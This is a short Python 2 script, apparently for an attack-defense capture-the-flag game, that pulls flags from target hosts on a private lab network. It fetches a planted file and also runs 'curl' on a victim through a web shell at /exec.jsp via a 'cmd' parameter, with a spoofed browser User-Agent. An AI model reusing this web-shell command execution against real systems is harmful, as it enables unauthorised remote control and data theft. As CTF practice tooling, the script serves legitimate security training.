#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
import base64
'''get flag from host_flags:
(type,host,url)
type:
    1:simple url(eg:gf.txt or .php)
    2:exec curl(eg:cmd=curl http://xxxx)
'''

host_flags=(
    (1,'172.16.80.144','/wordpress/gf.txt'),
    (2,'172.16.80.144:8080','/exec.jsp',{'cmd':'curl -s http://172.16.80.1:8000/flag.txt'})
    )

'''
try to base64 decode
'''
def base64decode(flag_str):
    try:
        return base64.decodestring(flag_str)
    except:
        return flag_str

'''
get flag from shell 
'''
def get_flag():
    headers = {
        'User-Agent': 'Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)'
    }
    for hf in host_flags:
        flag_type = hf[0]
        host = hf[1]
        url = "http://%s%s"%(host,hf[2])
        try:
            payload = {} if flag_type == 1 else hf[3]                
            #send request
            r = requests.get(url,timeout=5,params=payload,headers=headers)
            #print flag
            print '[+]%s:%s' %(host,base64decode(r.text))
        except Exception,e:
            print '[-]%s:fail->%s!' %(host,str(e))


def main():
    get_flag()

if __name__ == '__main__':
    main()

